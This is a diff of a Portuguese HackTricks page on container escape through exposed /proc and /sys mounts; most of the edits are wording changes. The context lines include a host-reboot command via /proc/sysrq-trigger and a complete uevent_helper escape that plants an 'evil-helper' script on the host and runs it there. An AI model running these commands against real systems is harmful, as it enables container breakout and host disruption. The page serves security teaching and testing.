@@ -14,11 +14,11 @@ Outras maneiras de apoiar o HackTricks:
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
-A exposição de `/proc` e `/sys` sem isolamento de namespace adequado introduz riscos significativos de segurança, incluindo aumento da superfície de ataque e divulgação de informações. Esses diretórios contêm arquivos sensíveis que, se mal configurados ou acessados por um usuário não autorizado, podem levar à fuga do contêiner, modificação do host ou fornecer informações que auxiliam em ataques adicionais. Por exemplo, montar incorretamente `-v /proc:/host/proc` pode contornar a proteção do AppArmor devido à sua natureza baseada em caminho, deixando `/host/proc` desprotegido.
+A exposição de `/proc` e `/sys` sem isolamento adequado de namespace introduz riscos significativos de segurança, incluindo aumento da superfície de ataque e divulgação de informações. Esses diretórios contêm arquivos sensíveis que, se mal configurados ou acessados por um usuário não autorizado, podem levar à fuga do contêiner, modificação do host ou fornecer informações que auxiliam em ataques adicionais. Por exemplo, montar incorretamente `-v /proc:/host/proc` pode contornar a proteção do AppArmor devido à sua natureza baseada em caminho, deixando `/host/proc` desprotegido.
 
 **Você pode encontrar mais detalhes de cada vulnerabilidade potencial em** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -66,7 +66,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acesso ao modprobe
 * Permite registrar interpretadores para formatos binários não nativos com base em seus números mágicos.
 * Pode levar à escalada de privilégios ou acesso ao shell root se `/proc/sys/fs/binfmt_misc/register` for gravável.
 * Exploração relevante e explicação:
-* [Rootkit de homem pobre via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
+* [Rootkit de pobre via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
 * Tutorial detalhado: [Link do vídeo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Outros em `/proc`
@@ -107,7 +107,7 @@ echo b > /proc/sysrq-trigger # Reinicia o host
 
 * Representa a memória física do sistema no formato de core ELF.
 * A leitura pode vazar conteúdos de memória do host e de outros contêineres.
-* O tamanho do arquivo grande pode levar a problemas de leitura ou travamentos de software.
+* O tamanho grande do arquivo pode levar a problemas de leitura ou falhas de software.
 * Uso detalhado em [Despejando /proc/kcore em 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
@@ -128,7 +128,7 @@ echo b > /proc/sysrq-trigger # Reinicia o host
 #### **`/proc/[pid]/mountinfo`**
 
 * Fornece informações sobre pontos de montagem no namespace de montagem do processo.
-* Expõe a localização do `rootfs` ou imagem do contêiner.
+* Expõe a localização do `rootfs` do contêiner ou da imagem.
 
 ### Vulnerabilidades do `/sys`
 
@@ -138,23 +138,23 @@ echo b > /proc/sysrq-trigger # Reinicia o host
 * Escrever em `/sys/kernel/uevent_helper` pode executar scripts arbitrários ao acionar `uevents`.
 *   **Exemplo de Exploração**: %%%bash
 
-## Cria um payload
+### Cria uma carga útil
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-## Encontra o caminho do host a partir da montagem OverlayFS para o contêiner
+### Encontra o caminho do host a partir da montagem OverlayFS para o contêiner
 
 host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-## Define uevent\_helper para o helper malicioso
+### Define uevent\_helper para o helper malicioso
 
 echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-## Aciona um uevent
+### Aciona um uevent
 
 echo change > /sys/class/mem/null/uevent
 
-## Lê a saída
+### Lê a saída
 
 cat /output %%%
 #### **`/sys/class/thermal`**
@@ -186,7 +186,7 @@ cat /output %%%
 * [Compreensão e Reforço de Contêineres Linux](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Abusando de Contêineres Linux Privilegiados e Não Privilegiados](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
